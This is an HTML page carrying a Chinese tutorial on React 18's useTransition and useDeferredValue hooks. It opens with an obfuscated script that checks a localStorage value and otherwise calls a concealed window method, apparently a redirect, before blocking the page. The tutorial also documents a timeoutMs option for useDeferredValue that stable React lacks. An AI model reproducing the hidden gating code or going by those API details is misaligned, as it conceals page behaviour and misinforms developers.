<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x182983=_0x3d22;function _0x3d22(l,s){var e=_0x519d();return(_0x3d22=function(s,n){var a=e[s-=193];void 0===_0x3d22.GefEWP&&(_0x3d22.yQRrlS=function(s,n){var a,t=[],l=0,e="";for(s=(s=>{for(var n,a,t="",l="",e=0,p=0;a=s.charAt(p++);~a&&(n=e%4?64*n+a:a,e++%4)&&(t+=String.fromCharCode(255&n>>(-2*e&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var c=0,r=t.length;c<r;c++)l+="%"+("00"+t.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(l)})(s),p=0;p<256;p++)t[p]=p;for(p=0;p<256;p++)l=(l+t[p]+n.charCodeAt(p%n.length))%256,a=t[p],t[p]=t[l],t[l]=a;for(var p=0,l=0,c=0;c<s.length;c++)a=t[p=(p+1)%256],t[p]=t[l=(l+t[p])%256],t[l]=a,e+=String.fromCharCode(s.charCodeAt(c)^t[(t[p]+t[l])%256]);return e},l=arguments,_0x3d22.GefEWP=!0);var s=s+e[0],t=l[s];return t?a=t:(void 0===_0x3d22.SKiuxp&&(_0x3d22.SKiuxp=!0),a=_0x3d22.yQRrlS(a,n),l[s]=a),a})(l,s)}if((()=>{for(var s=_0x3d22,n=_0x519d();;)try{if(741400==-parseInt(s(219,"4OTt"))*(parseInt(s(203,"Ek^&"))/2)+-parseInt(s(210,"NP]K"))/3+-parseInt(s(199,"AdO#"))/4+parseInt(s(207,"4OTt"))/5*(parseInt(s(197,"$QC)"))/6)+-parseInt(s(213,"FfcW"))/7*(-parseInt(s(206,"[M*H"))/8)+-parseInt(s(198,"p]Da"))/9*(parseInt(s(194,"H#!O"))/10)+parseInt(s(200,"2rBs"))/11)break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x182983(211,"GXRU")](_0x182983(215,"Ft]d"))!=_0x182983(205,"i4VK"))throw window[_0x182983(201,"Cwnj")][_0x182983(214,"*cWI")](_0x182983(209,"AdO#")),Error();function _0x519d(){var s=["c8kaW6mXyuT6W57cOCoxW4LloG","W7nom8otrH09WPlcSwBdPKFdS0C","d2a0yLVdReNdSG","WR7dR8oxdZzNfSk5W7rPWPuQ","W5BcGrlcPSoKEh7dRKddUI8","WPm7W40sWQFcHmk/D2CjpW","iSkomeddRW","W4lcHCkLjanWW6lcGZZcK8o6W6xdKq","A8oZW7NdK8k9WQ9rvMuz","vIZcGSoSvCoHWPfVW68hW6ddVs7cQG","umomWQz5iKfHWOdcKCouW7bieZSzW7xdPHivAmotWObDW7LPAa","WRH9WOuHjmokkCkrWRNdPZNdMq","obhdOSoDhaldIa","umo7sCo9W7FcRcJcKKf3","mSkCW4H1WP/dSmoq","WO3cUSkFWOb3vmo8","WRj/WODXWONdJu/dLhm","pqddKCkxW5ZcVsJdKttdMG0","d8o6WRH4oXK/","W4RcHCkHje4OWR7cUa/cSG","BCo9WQZcRCklWRDvFa","vctcHCoLumoNWP0SW7uGW7VdMra","y8oclN3dJIRdKrS","imoBWQaYEmkNWPSJWOaj","WRD5WOSKi8oit8kEWOldGWxdO3C","WPfqWRLoW6/dOCoNW6dcUmkv","paJdMmksWRhcHqddTWddMW","WOf1B8oEWRFdQSoRWQLbcCoK"];return(_0x519d=function(){return s})()}document.title="React useTransition 与 useDeferredValue 详解",document.getElementById("article").innerHTML='<div><p><code>useTransition</code> 和 <code>useDeferredValue</code> 是 React 18 中用于优化并发渲染的两个核心 Hooks，它们通过控制渲染优先级，显著提升复杂应用的响应性和用户体验。以下是对它们的深入解析：</p>\n<h3><strong>1. 核心概念：优先级分离</strong></h3>\n<p>React 18 的并发渲染允许将更新分为两种优先级：</p>\n<ul>\n<li><strong>紧急更新</strong>  （Urgent Updates）：立即响应用户交互（如点击、输入）</li>\n<li><strong>过渡更新</strong>  （Transition Updates）：非紧急的 UI 变化（如搜索结果、数据加载）</li>\n</ul>\n<p><code>useTransition</code> 和 <code>useDeferredValue</code> 是实现这种优先级分离的关键工具：</p>\n<h3><strong>2. <code>useTransition</code>：标记低优先级更新</strong></h3>\n<h4><strong>基本用法</strong></h4>\n<pre><code class="language-javascript"><span class="hljs-keyword">import</span> { useTransition } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;\n\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">SearchBar</span>(<span class="hljs-params"></span>) {\n  <span class="hljs-keyword">const</span> [isPending, startTransition] = <span class="hljs-title function_">useTransition</span>();\n  <span class="hljs-keyword">const</span> [query, setQuery] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);\n  <span class="hljs-keyword">const</span> [results, setResults] = <span class="hljs-title function_">useState</span>([]);\n\n  <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleChange</span>(<span class="hljs-params">e</span>) {\n    <span class="hljs-keyword">const</span> value = e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>;\n    <span class="hljs-title function_">setQuery</span>(value); <span class="hljs-comment">// 高优先级：立即更新输入框</span>\n    \n    <span class="hljs-comment">// 低优先级：搜索结果更新可被中断</span>\n    <span class="hljs-title function_">startTransition</span>(<span class="hljs-function">() =&gt;</span> {\n      <span class="hljs-title function_">setResults</span>(<span class="hljs-title function_">fetchResults</span>(value));\n    });\n  }\n\n  <span class="hljs-keyword">return</span> (\n    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>\n      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{query}</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{handleChange}</span> /&gt;</span>\n      {isPending ? <span class="hljs-tag">&lt;<span class="hljs-name">Spinner</span> /&gt;</span> : <span class="hljs-tag">&lt;<span class="hljs-name">Results</span> <span class="hljs-attr">data</span>=<span class="hljs-string">{results}</span> /&gt;</span>}\n    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>\n  );\n}\n</code></pre>\n<h4><strong>核心机制</strong></h4>\n<ul>\n<li><strong><code>startTransition</code></strong>  ：将回调中的状态更新标记为“过渡”，允许被高优先级更新中断</li>\n<li><strong><code>isPending</code></strong>  ：指示过渡是否正在进行，可用于显示加载状态</li>\n<li><strong>中断逻辑</strong>  ：若在过渡期间有新的高优先级更新（如用户继续输入），React 会放弃当前过渡，直接处理新更新</li>\n</ul>\n<h4><strong>适用场景</strong></h4>\n<ul>\n<li>搜索框实时搜索（输入框响应优先于结果渲染）</li>\n<li>路由切换动画（新页面渲染可延迟，旧页面保持可交互）</li>\n<li>复杂计算结果更新（如大数据可视化）</li>\n</ul>\n<h3><strong>3. <code>useDeferredValue</code>：延迟非关键值的更新</strong></h3>\n<h4><strong>基本用法</strong></h4>\n<pre><code class="language-javascript"><span class="hljs-keyword">import</span> { useDeferredValue } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;\n\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">LargeList</span>(<span class="hljs-params">{ items }</span>) {\n  <span class="hljs-comment">// 延迟处理的列表数据，不会阻塞 UI 响应</span>\n  <span class="hljs-keyword">const</span> deferredItems = <span class="hljs-title function_">useDeferredValue</span>(items);\n\n  <span class="hljs-keyword">return</span> (\n    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>\n      {deferredItems.map(item =&gt; (\n        <span class="hljs-tag">&lt;<span class="hljs-name">Item</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{item.id}</span> {<span class="hljs-attr">...item</span>} /&gt;</span>\n      ))}\n    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>\n  );\n}\n</code></pre>\n<h4><strong>核心机制</strong></h4>\n<ul>\n<li><strong>创建延迟值</strong>  ：<code>useDeferredValue(value)</code> 返回一个延迟版本的 <code>value</code>，该值会在主线程空闲时更新</li>\n<li><strong>优先级分离</strong>  ：当 <code>value</code> 变化时，UI 会先使用旧值保持响应，待主线程空闲时再更新为新值</li>\n<li><strong>可选超时</strong>  ：<code>useDeferredValue(value, { timeoutMs: 500 })</code> 指定最长延迟时间</li>\n</ul>\n<h4><strong>适用场景</strong></h4>\n<ul>\n<li>大型列表渲染（将列表更新延迟，保持滚动流畅）</li>\n<li>复杂组件渲染（如富文本编辑器中的预览区域）</li>\n<li>非关键数据展示（如次要信息面板）</li>\n</ul>\n<h3><strong>4. 对比与协作</strong></h3>\n<table>\n<thead>\n<tr>\n<th><strong>特性</strong></th>\n<th><strong>useTransition</strong></th>\n<th><strong>useDeferredValue</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>核心作用</strong></td>\n<td>标记低优先级状态更新</td>\n<td>创建延迟版本的值</td>\n</tr>\n<tr>\n<td><strong>控制粒度</strong></td>\n<td>整个更新过程</td>\n<td>单个值的更新</td>\n</tr>\n<tr>\n<td><strong>返回值</strong></td>\n<td><code>[isPending, startTransition]</code></td>\n<td>延迟版本的 value</td>\n</tr>\n<tr>\n<td><strong>触发方式</strong></td>\n<td>主动调用 <code>startTransition</code></td>\n<td>自动延迟，无需显式调用</td>\n</tr>\n<tr>\n<td><strong>典型场景</strong></td>\n<td>搜索结果更新、路由切换</td>\n<td>大型列表、复杂组件渲染</td>\n</tr>\n</tbody>\n</table>\n<h3><strong>5. 高级用法与最佳实践</strong></h3>\n<h4><strong>5.1 结合使用优化复杂场景</strong></h4>\n<pre><code class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">SearchResults</span>(<span class="hljs-params">{ query }</span>) {\n  <span class="hljs-comment">// 延迟处理查询词，避免每次输入都触发重渲染</span>\n  <span class="hljs-keyword">const</span> deferredQuery = <span class="hljs-title function_">useDeferredValue</span>(query);\n  \n  <span class="hljs-comment">// 使用过渡状态处理结果加载</span>\n  <span class="hljs-keyword">const</span> [results, setResults] = <span class="hljs-title function_">useState</span>([]);\n  <span class="hljs-keyword">const</span> [isPending, startTransition] = <span class="hljs-title function_">useTransition</span>();\n\n  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {\n    <span class="hljs-title function_">startTransition</span>(<span class="hljs-function">() =&gt;</span> {\n      <span class="hljs-title function_">fetchResults</span>(deferredQuery).<span class="hljs-title function_">then</span>(setResults);\n    });\n  }, [deferredQuery]); <span class="hljs-comment">// 仅在延迟查询词变化时触发</span>\n\n  <span class="hljs-keyword">return</span> (\n    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>\n      {isPending ? <span class="hljs-tag">&lt;<span class="hljs-name">Spinner</span> /&gt;</span> : <span class="hljs-tag">&lt;<span class="hljs-name">ResultsList</span> <span class="hljs-attr">data</span>=<span class="hljs-string">{results}</span> /&gt;</span>}\n    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>\n  );\n}\n</code></pre>\n<h4><strong>5.2 避免过度延迟</strong></h4>\n<ul>\n<li>为 <code>useDeferredValue</code> 设置合理的超时时间：<pre><code class="language-javascript"><span class="hljs-keyword">const</span> deferredValue = <span class="hljs-title function_">useDeferredValue</span>(value, { <span class="hljs-attr">timeoutMs</span>: <span class="hljs-number">300</span> });\n</code></pre>\n</li>\n<li>确保关键 UI 变化不会被无限延迟</li>\n</ul>\n<h4><strong>5.3 优化渲染性能</strong></h4>\n<ul>\n<li>使用 <code>React.memo</code> 避免不必要的子组件重渲染：<pre><code class="language-javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Item</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">{ item }</span>) =&gt;</span> {\n  <span class="hljs-comment">// 仅在 item 真正变化时才重新渲染</span>\n  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{item.name}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;\n});\n</code></pre>\n</li>\n</ul>\n<h3><strong>6. 与 Suspense 的协同工作</strong></h3>\n<p><code>useTransition</code> 和 <code>useDeferredValue</code> 可与 <code>Suspense</code> 结合，处理异步加载：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) {\n  <span class="hljs-keyword">const</span> [resource, setResource] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);\n  <span class="hljs-keyword">const</span> [isPending, startTransition] = <span class="hljs-title function_">useTransition</span>();\n\n  <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleClick</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-title function_">startTransition</span>(<span class="hljs-function">() =&gt;</span> {\n      <span class="hljs-title function_">setResource</span>(<span class="hljs-title function_">fetchResource</span>()); <span class="hljs-comment">// 假设 fetchResource 返回一个可 Suspense 的 Promise</span>\n    });\n  }\n\n  <span class="hljs-keyword">return</span> (\n    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>\n      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleClick}</span>&gt;</span>加载数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>\n      {isPending ? <span class="hljs-tag">&lt;<span class="hljs-name">Spinner</span> /&gt;</span> : null}\n      <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Spinner</span> /&gt;</span>}&gt;\n        <span class="hljs-tag">&lt;<span class="hljs-name">ResourceDisplay</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">{resource}</span> /&gt;</span>\n      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span>\n    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>\n  );\n}\n</code></pre>\n<h3><strong>7. 注意事项</strong></h3>\n<ol>\n<li><strong>副作用管理</strong>  ：\n<ul>\n<li>避免在 <code>useTransition</code> 回调中执行副作用（如网络请求），应放在 <code>useEffect</code> 中</li>\n<li>使用 <code>useEffect</code> 而非 <code>useLayoutEffect</code>，避免阻塞渲染</li>\n</ul>\n</li>\n<li><strong>状态更新方式</strong>  ：\n<ul>\n<li>优先使用函数式更新（<code>setState(prev =&gt; ...)</code>），避免依赖过时的 state</li>\n</ul>\n</li>\n<li><strong>调试建议</strong>  ：\n<ul>\n<li>在 React DevTools 中使用“Profiler”面板分析并发渲染性能</li>\n<li>开启 StrictMode 暴露潜在的并发问题</li>\n</ul>\n</li>\n</ol>\n<h3><strong>总结</strong></h3>\n<ul>\n<li><strong><code>useTransition</code></strong>  ：用于控制状态更新的优先级，适用于标记非紧急更新</li>\n<li><strong><code>useDeferredValue</code></strong>  ：用于延迟处理非关键数据，保持 UI 响应性</li>\n<li><strong>核心价值</strong>  ：通过优先级分离，让 React 应用在处理复杂任务时保持流畅响应，显著提升用户体验</li>\n</ul>\n<p>这两个 Hooks 是 React 18 并发渲染的核心工具，掌握它们的使用是构建高性能 React 应用的关键。</p>\n</div>'</script></body></html>